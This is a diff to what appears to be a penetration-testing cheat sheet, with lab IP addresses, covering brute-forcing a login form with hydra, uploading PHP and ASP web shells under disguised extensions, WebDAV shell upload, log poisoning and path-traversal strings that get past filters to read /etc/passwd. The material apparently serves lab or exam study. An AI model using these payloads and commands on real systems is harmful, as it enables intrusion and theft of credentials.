@@ -168,25 +168,26 @@ hydra -L names -P /usr/share/wordlists/fasttrack.txt 192.168.1.20 http-post-form
 # Enumerate Web Application
 #### Web Application target
 ```Curl``` and enum for versioning: OS, Server, language(s), Web Application, DB
-- View page-source; commented code and webapp version
+- View ```page-source```; commented code and webapp version
   - Search webapp version and pull it - docs and structure / or straight exploit
 - Look for an interface to upload files (that includes installing plugins) - upload a webshell & browse to execute!!
-  - Upload in language server native (asp or php), and give approp extension (```.jpg.html```) e.g., ```php-reverse-shell.php.gif```
+  - Upload in language server native (```.asp(x)``` or ```php```), and give approp extension (```.jpg.html```) e.g., ```php-reverse-shell.php.gif```
   - Try a full reverse-shell first! and then a simple php call for RCE if it fails
 
 #### WebDAV
 ```davtest -url http://10.11.1.229```
+
 ```
 Cadaver http://10.11.1.229
 put shell.txt
 move shell.txt
 shell.asp
 ```
+
 #### LFI/RFI
 Anything that has a   ```http://website/page?=foo```
 
-We are looking for credentials similar to FTP Traversal, as well as a place to run code e.g., 
-contaminate the logs with PHP script.
+We are looking for credentials similar to FTP Traversal, as well as a place to run code e.g., contaminate the logs with PHP script.
 
 #### LFI
 Don't forget escape characters:
@@ -203,6 +204,8 @@ Common Obstacles:
 ..%c0%af or ..%252f
  ....// or ....\/
 /etc/etc/passwd  -‘etc’ may be sanitised by php include function
+//etc//etc//passwd
+\//etc\//etc\//passwd
 POST ?page=php://input&cmd=whoami
 ```
 
